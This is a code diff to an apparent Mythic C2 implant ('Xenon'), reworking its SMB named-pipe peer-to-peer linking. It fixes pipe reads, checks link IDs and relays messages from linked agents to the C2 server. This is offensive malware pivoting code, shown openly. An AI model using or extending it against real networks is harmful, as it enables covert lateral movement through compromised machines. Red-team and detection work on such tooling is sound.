@@ -4,6 +4,7 @@
 #include "Package.h"
 #include "Parser.h"
 #include "Task.h"
+#include "Utils.h"
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_LINK
@@ -76,9 +77,9 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
         _dbg("P2P New UUID           : %s", P2pUuid);
         _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
 
-        // Update payload ID
+        /* Update Mythic ID for Link */
         xenonConfig->SmbLinks->AgentId = P2pUuid;
-
+        
         /* Forward Checkin Response to intended Linked Agent */
         LinkForward( P2pMsg, P2pMsgLen );
     }
@@ -136,6 +137,7 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 
     hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
 
+    
     if ( hPipe == INVALID_HANDLE_VALUE )
     {
         _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
@@ -150,17 +152,25 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
         }
     }
 
+    DWORD BytesAvailable = 0;
     do
     {
-        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
+        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, &BytesAvailable, NULL ) )
         {
-            if ( *outLen > 0 )
+            if ( BytesAvailable > 0 )
             {
-                *outBuf = LocalAlloc(LPTR, *outLen);
-                memset(*outBuf, 0, *outLen);
+                _dbg("Bytes available - %d bytes", BytesAvailable);
+                
+                *outBuf = LocalAlloc(LPTR, BytesAvailable);
+                memset(*outBuf, 0, BytesAvailable);
 
-                if ( ReadFile( hPipe, *outBuf, *outLen, outLen, NULL ) )
+                if ( ReadFile( hPipe, *outBuf, BytesAvailable, outLen, NULL ) )
                 {
+                    if ( *outLen < BytesAvailable )
+                    {
+                        _err("Didn't read all the bytes from the pipe. Bytes read %d ", *outLen);
+                    }
+
                     break;
                 }
                 else
@@ -178,6 +188,7 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
             return FALSE;
         }
     } while ( TRUE );
+
 
     /* Add this Pivot Link to list */
     {
@@ -222,6 +233,11 @@ BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 }
 
 
+/**
+ * @brief Send message to P2P Pipe
+ * 
+ * @return BOOL
+ */
 BOOL LinkForward( PVOID Msg, SIZE_T Length )
 {
     /** New Packet Format
@@ -259,6 +275,8 @@ BOOL LinkForward( PVOID Msg, SIZE_T Length )
     BOOL    Success          = FALSE;
     PLINKS  TempLink         = xenonConfig->SmbLinks;
 
+    _dbg("Sending message to pipe [%x]", TempLink->LinkId);
+
     if ( !PackageSendPipe(TempLink->hPipe, Msg, Length) ) {
         DWORD error = GetLastError();
         _err("Failed to write data to pipe. ERROR : %d", error);
@@ -273,36 +291,12 @@ END:
 }
 
 
-UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
-{
-    PARSER  Parser    = { 0 };
-    UINT32  Value     = 0;
-
-    ParserNew( &Parser, Buffer, Length );
-
-    // Value  = ParserStringCopy(&Parser, &uuidLen);
-    Value = ParserGetInt32(&Parser);
-
-    _dbg("Parsed SMB Link ID => %x \n", Value);
-
-    ParserDestroy(&Parser);
-
-    return Value;
-
-    /* Test */
-    // PARSER  Parser    = { 0 };
-    // UINT32  Value     = 0;
-
-    // ParserNew( &Parser, Buffer, Length );
-
-    // return ParserGetInt32(&Parser);
-
-}
-
 /**
- * @brief Checks all Links for updates then pushes them to server
+ * @brief Pushes all Link updates to server
  * 
- * Note - this method does cause several network requests
+ * Note - This method does cause extra network requests
+ * 
+ * @return VOID
  */
 VOID LinkPush()
 {
@@ -322,7 +316,7 @@ VOID LinkPush()
 
     do
     {
-        if ( ! TempList )
+        if ( !TempList )
             break;
 
         if ( TempList->hPipe )
@@ -333,28 +327,42 @@ VOID LinkPush()
                 if ( PeekNamedPipe( TempList->hPipe, NULL, 0, NULL, &BytesSize, NULL ) )
                 {
                     if ( BytesSize >= sizeof( UINT32 ) )
-                    {
-                        _dbg("Link ID [%x] has message of %d bytes", TempList->LinkId, BytesSize);
-                        
+                    {                           
                         Length = BytesSize;
                         Output = LocalAlloc( LPTR, Length );
                         memset(Output, 0, BytesSize);
 
                         if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
                         {
-                            /*
-                                TODO - fix this delegate message isn't being recognized by Mythic
-                            */
-                            _dbg("Linked Agent -> C2");
+                            _dbg("Linked Agent -> (Msg %d bytes) -> C2", BytesSize);
                             print_bytes(Output, BytesSize);
+
+                            /* Verify Our Link ID from the package */
+                            PARSER Temp = { 0 };
+                            ParserNew(&Temp, Output, BytesSize);
+
+                            UINT32 TempId = ParserGetInt32(&Temp);
+                            if ( TempId != TempList->LinkId ) {
+                                _dbg("Temp ID [%x]", TempId);
+                                _dbg("Link ID [%x]", TempList->LinkId);
+                                _err("Incorrect Link ID for package. Moving on...");
+                                ParserDestroy(&Temp);
+                                continue;
+                            }
+                            // UINT32 TempId = *(UINT32*)Output;
+                            // Output      += 4;
+                            // BytesSize   -= 4;
+                            _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);
+
                             /* Send Link msg as a delegate type (LINK_MSG) */
                             Package = PackageInit( LINK_MSG, TRUE );
                             PackageAddString( Package, TempList->AgentId, FALSE );
-                            PackageAddBytes( Package, Output, BytesSize, TRUE );
+                            PackageAddBytes( Package, Temp.Buffer, Temp.Length, TRUE );
 
                             PackageSend( Package, NULL );
 
                             /* Clean up */
+                            ParserDestroy(&Temp);
                             LocalFree(Output);
                             Output = NULL;
                             Length = 0;
@@ -367,42 +375,6 @@ VOID LinkPush()
                             Length = 0;
                             break;
                         }
-
-
-                        // if ( PeekNamedPipe( TempList->hPipe, &Length, BytesSize, NULL, &BytesSize, NULL ) )
-                        // {
-                        //     Length = __builtin_bswap32( Length ) + sizeof( UINT32 );
-                        //     Output = LocalAlloc( LPTR, Length );
-
-                        //     if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
-                        //     {
-                        //         _dbg("Linked Agent -> C2: %s", Output)
-                        //         /* Send Link msg as a delegate type (LINK_MSG) */
-                        //         Package = PackageInit( LINK_MSG, TRUE );
-                        //         PackageAddString( Package, TempList->AgentId, FALSE );
-                        //         PackageAddBytes( Package, Output, BytesSize, TRUE );
-
-                        //         PackageSend( Package, NULL );
-
-                        //         /* Clean up */
-                        //         LocalFree(Output);
-                        //         Output = NULL;
-                        //         Length = 0;
-                        //     }
-                        //     else
-                        //     {
-                        //         _err( "ReadFile: Failed[%d]\n", GetLastError() );
-                        //         LocalFree(Output);
-                        //         Output = NULL;
-                        //         Length = 0;
-                        //         break;
-                        //     }
-                        // }
-                        // else
-                        // {
-                        //     _err( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
-                        //     break;
-                        // }
                     }
                     else 
                     {
@@ -451,8 +423,22 @@ VOID LinkPush()
 }
 
 
+UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
+{
+    PARSER  Parser    = { 0 };
+    UINT32  Value     = 0;
 
+    ParserNew( &Parser, Buffer, Length );
 
+    // Value  = ParserStringCopy(&Parser, &uuidLen);
+    Value = ParserGetInt32(&Parser);
+
+    _dbg("Parsed SMB Link ID => %x \n", Value);
+
+    ParserDestroy(&Parser);
+
+    return Value;
+}
 
 
 #endif  //INCLUDE_CMD_LINK
